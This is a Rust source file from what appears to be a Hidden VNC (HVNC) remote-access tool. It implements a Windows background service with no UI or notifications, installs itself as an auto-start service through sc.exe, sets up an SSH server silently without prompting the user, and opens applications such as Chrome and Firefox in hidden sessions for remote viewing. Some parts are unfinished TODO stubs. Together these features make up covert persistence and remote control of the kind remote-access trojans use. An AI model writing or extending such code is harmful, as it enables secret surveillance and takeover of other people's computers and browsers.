//! Background service for Hidden VNC host
//! 
//! This module provides a Windows service that runs in the background
//! without any UI or notifications, automatically handling HVNC connections.

use crate::error::{HvncError, Result};
use crate::host::{HvncServer, SshSetup};
use crate::common::ServerConfig;
use log::{info, warn, error, debug};
use std::sync::{Arc, Mutex};
use std::sync::atomic::{AtomicBool, Ordering};
use std::thread;
use std::time::Duration;
use std::collections::HashMap;

/// Background service manager
pub struct HvncService {
    servers: Arc<Mutex<HashMap<String, HvncServer>>>,
    pub running: Arc<AtomicBool>,
    config: ServiceConfig,
}

/// Service configuration
#[derive(Debug, Clone)]
pub struct ServiceConfig {
    pub auto_start: bool,
    pub silent_mode: bool,
    pub max_connections: u32,
    pub default_applications: Vec<String>,
    pub quality_settings: QualityConfig,
}

/// Quality configuration for the service
#[derive(Debug, Clone)]
pub struct QualityConfig {
    pub default_quality: u8,
    pub default_fps: u32,
    pub adaptive_quality: bool,
    pub bandwidth_monitoring: bool,
}

impl Default for ServiceConfig {
    fn default() -> Self {
        Self {
            auto_start: true,
            silent_mode: true,
            max_connections: 5,
            default_applications: vec![
                "notepad.exe".to_string(),
                "calc.exe".to_string(),
                "chrome.exe".to_string(),
                "firefox.exe".to_string(),
            ],
            quality_settings: QualityConfig {
                default_quality: 80,
                default_fps: 30,
                adaptive_quality: true,
                bandwidth_monitoring: true,
            },
        }
    }
}

impl HvncService {
    /// Create a new background service
    pub fn new(config: ServiceConfig) -> Self {
        Self {
            servers: Arc::new(Mutex::new(HashMap::new())),
            running: Arc::new(AtomicBool::new(false)),
            config,
        }
    }

    /// Start the background service
    pub fn start(&self) -> Result<()> {
        if self.running.load(Ordering::Relaxed) {
            return Ok(()); // Already running
        }

        info!("Starting HVNC background service...");

        // Setup SSH server automatically (silent mode)
        self.setup_ssh_silent()?;

        // Start the main service loop
        self.running.store(true, Ordering::Relaxed);
        self.start_service_loop()?;

        info!("HVNC background service started successfully");
        Ok(())
    }

    /// Stop the background service
    pub fn stop(&self) -> Result<()> {
        info!("Stopping HVNC background service...");

        self.running.store(false, Ordering::Relaxed);

        // Stop all servers
        let mut servers = self.servers.lock().unwrap();
        servers.clear();

        info!("HVNC background service stopped");
        Ok(())
    }

    /// Setup SSH server in silent mode (no UI)
    fn setup_ssh_silent(&self) -> Result<()> {
        debug!("Setting up SSH server in silent mode...");

        let mut ssh_setup = SshSetup::new();
        
        // Use silent auto-setup that doesn't prompt user
        let ssh_info = match ssh_setup.auto_setup() {
            Ok(info) => info,
            Err(e) => {
                warn!("SSH setup failed, continuing without SSH: {}", e);
                return Ok(()); // Continue service without SSH
            }
        };

        // Save connection info silently (no display)
        if let Err(e) = ssh_info.save_to_file("hvnc_connection_info.txt") {
            warn!("Failed to save connection info: {}", e);
        }

        debug!("SSH server setup completed silently");
        Ok(())
    }

    /// Start the main service loop
    fn start_service_loop(&self) -> Result<()> {
        let running = self.running.clone();
        let servers = self.servers.clone();
        let config = self.config.clone();

        thread::spawn(move || {
            while running.load(Ordering::Relaxed) {
                // Handle incoming connection requests
                if let Err(e) = Self::handle_service_requests(&servers, &config) {
                    error!("Service loop error: {}", e);
                }

                // Monitor existing connections
                Self::monitor_connections(&servers);

                // Cleanup inactive connections
                Self::cleanup_inactive_connections(&servers);

                thread::sleep(Duration::from_secs(5));
            }
        });

        Ok(())
    }

    /// Handle incoming service requests
    fn handle_service_requests(
        servers: &Arc<Mutex<HashMap<String, HvncServer>>>,
        config: &ServiceConfig,
    ) -> Result<()> {
        // Check for application launch requests
        if let Ok(requests) = Self::check_launch_requests() {
            for request in requests {
                Self::handle_launch_request(servers, config, request)?;
            }
        }

        Ok(())
    }

    /// Check for application launch requests
    fn check_launch_requests() -> Result<Vec<LaunchRequest>> {
        // TODO: Implement request checking mechanism
        // This could be:
        // - File-based communication
        // - Named pipes
        // - TCP socket
        // - Windows messages
        
        Ok(vec![])
    }

    /// Handle a launch request
    fn handle_launch_request(
        servers: &Arc<Mutex<HashMap<String, HvncServer>>>,
        config: &ServiceConfig,
        request: LaunchRequest,
    ) -> Result<()> {
        info!("Handling launch request: {:?}", request);

        // Create server configuration
        let server_config = ServerConfig {
            bind_address: "127.0.0.1:5900".to_string(),
            target_application: request.application.clone(),
            jpeg_quality: request.quality.unwrap_or(config.quality_settings.default_quality),
            frame_rate_ms: request.fps.unwrap_or(config.quality_settings.default_fps) as u64,
        };

        // Create and start server
        let mut server = HvncServer::new(server_config);
        server.auto_setup()?;

        // Store server
        let server_id = format!("{}_{}", request.application, chrono::Utc::now().timestamp());
        let mut servers_map = servers.lock().unwrap();
        servers_map.insert(server_id, server);

        Ok(())
    }

    /// Monitor existing connections
    fn monitor_connections(servers: &Arc<Mutex<HashMap<String, HvncServer>>>) {
        let servers_map = servers.lock().unwrap();
        for (id, server) in servers_map.iter() {
            // TODO: Check server health
            debug!("Monitoring server: {}", id);
        }
    }

    /// Cleanup inactive connections
    fn cleanup_inactive_connections(servers: &Arc<Mutex<HashMap<String, HvncServer>>>) {
        let mut servers_map = servers.lock().unwrap();
        let mut to_remove: Vec<String> = Vec::new();

        for (id, _server) in servers_map.iter() {
            // TODO: Check if server is inactive
            // For now, keep all servers
            debug!("Checking server activity: {}", id);
        }

        for id in to_remove {
            servers_map.remove(&id);
            info!("Removed inactive server: {}", id);
        }
    }

    /// Install as Windows service
    pub fn install_service() -> Result<()> {
        info!("Installing HVNC as Windows service...");

        let service_name = "HVNCService";
        let display_name = "Hidden VNC Service";
        let description = "Hidden Virtual Network Computing background service";

        // Get current executable path
        let exe_path = std::env::current_exe()
            .map_err(|e| HvncError::OperationFailed(format!("Failed to get exe path: {}", e)))?;

        let exe_path_str = exe_path.to_string_lossy();

        // Create service
        let output = std::process::Command::new("sc")
            .args(&[
                "create",
                service_name,
                &format!("binPath= {} --service", exe_path_str),
                &format!("DisplayName= {}", display_name),
                "start= auto",
                "type= own",
            ])
            .output()
            .map_err(|e| HvncError::OperationFailed(format!("Failed to create service: {}", e)))?;

        if !output.status.success() {
            let error = String::from_utf8_lossy(&output.stderr);
            return Err(HvncError::OperationFailed(format!("Service creation failed: {}", error)));
        }

        // Set service description
        let _ = std::process::Command::new("sc")
            .args(&["description", service_name, description])
            .output();

        // Start service
        let output = std::process::Command::new("sc")
            .args(&["start", service_name])
            .output()
            .map_err(|e| HvncError::OperationFailed(format!("Failed to start service: {}", e)))?;

        if !output.status.success() {
            let error = String::from_utf8_lossy(&output.stderr);
            warn!("Service start warning: {}", error);
        }

        info!("HVNC service installed and started successfully");
        Ok(())
    }

    /// Uninstall Windows service
    pub fn uninstall_service() -> Result<()> {
        info!("Uninstalling HVNC Windows service...");

        let service_name = "HVNCService";

        // Stop service
        let _ = std::process::Command::new("sc")
            .args(&["stop", service_name])
            .output();

        // Delete service
        let output = std::process::Command::new("sc")
            .args(&["delete", service_name])
            .output()
            .map_err(|e| HvncError::OperationFailed(format!("Failed to delete service: {}", e)))?;

        if !output.status.success() {
            let error = String::from_utf8_lossy(&output.stderr);
            return Err(HvncError::OperationFailed(format!("Service deletion failed: {}", error)));
        }

        info!("HVNC service uninstalled successfully");
        Ok(())
    }

    /// Run as Windows service
    pub fn run_as_service() -> Result<()> {
        info!("Running as Windows service...");

        let config = ServiceConfig::default();
        let service = HvncService::new(config);

        // Start service
        service.start()?;

        // Keep service running
        loop {
            if !service.running.load(Ordering::Relaxed) {
                break;
            }
            thread::sleep(Duration::from_secs(10));
        }

        Ok(())
    }
}

/// Application launch request
#[derive(Debug, Clone)]
pub struct LaunchRequest {
    pub application: String,
    pub args: Vec<String>,
    pub quality: Option<u8>,
    pub fps: Option<u32>,
    pub requester: String,
}

/// Service control interface
pub struct ServiceControl;

impl ServiceControl {
    /// Send application launch request to service
    pub fn launch_application(
        application: &str,
        args: &[String],
        quality: Option<u8>,
        fps: Option<u32>,
    ) -> Result<()> {
        let request = LaunchRequest {
            application: application.to_string(),
            args: args.to_vec(),
            quality,
            fps,
            requester: "client".to_string(),
        };

        // TODO: Send request to service
        // This could use:
        // - File-based communication
        // - Named pipes
        // - TCP socket
        // - Windows messages

        info!("Sent launch request: {:?}", request);
        Ok(())
    }

    /// Get service status
    pub fn get_service_status() -> Result<ServiceStatus> {
        let output = std::process::Command::new("sc")
            .args(&["query", "HVNCService"])
            .output()
            .map_err(|e| HvncError::OperationFailed(format!("Failed to query service: {}", e)))?;

        let output_str = String::from_utf8_lossy(&output.stdout);
        
        if output_str.contains("RUNNING") {
            Ok(ServiceStatus::Running)
        } else if output_str.contains("STOPPED") {
            Ok(ServiceStatus::Stopped)
        } else if output_str.contains("does not exist") {
            Ok(ServiceStatus::NotInstalled)
        } else {
            Ok(ServiceStatus::Unknown)
        }
    }

    /// Start the service
    pub fn start_service() -> Result<()> {
        let output = std::process::Command::new("sc")
            .args(&["start", "HVNCService"])
            .output()
            .map_err(|e| HvncError::OperationFailed(format!("Failed to start service: {}", e)))?;

        if output.status.success() {
            info!("Service started successfully");
            Ok(())
        } else {
            let error = String::from_utf8_lossy(&output.stderr);
            Err(HvncError::OperationFailed(format!("Service start failed: {}", error)))
        }
    }

    /// Stop the service
    pub fn stop_service() -> Result<()> {
        let output = std::process::Command::new("sc")
            .args(&["stop", "HVNCService"])
            .output()
            .map_err(|e| HvncError::OperationFailed(format!("Failed to stop service: {}", e)))?;

        if output.status.success() {
            info!("Service stopped successfully");
            Ok(())
        } else {
            let error = String::from_utf8_lossy(&output.stderr);
            Err(HvncError::OperationFailed(format!("Service stop failed: {}", error)))
        }
    }
}

/// Service status
#[derive(Debug, Clone, PartialEq)]
pub enum ServiceStatus {
    Running,
    Stopped,
    NotInstalled,
    Unknown,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_service_config_default() {
        let config = ServiceConfig::default();
        assert!(config.auto_start);
        assert!(config.silent_mode);
        assert_eq!(config.max_connections, 5);
        assert!(config.default_applications.contains(&"notepad.exe".to_string()));
    }

    #[test]
    fn test_service_creation() {
        let config = ServiceConfig::default();
        let service = HvncService::new(config);
        assert!(!service.running.load(Ordering::Relaxed));
    }

    #[test]
    fn test_launch_request() {
        let request = LaunchRequest {
            application: "chrome.exe".to_string(),
            args: vec!["--incognito".to_string()],
            quality: Some(80),
            fps: Some(30),
            requester: "test".to_string(),
        };

        assert_eq!(request.application, "chrome.exe");
        assert_eq!(request.args.len(), 1);
        assert_eq!(request.quality, Some(80));
    }
}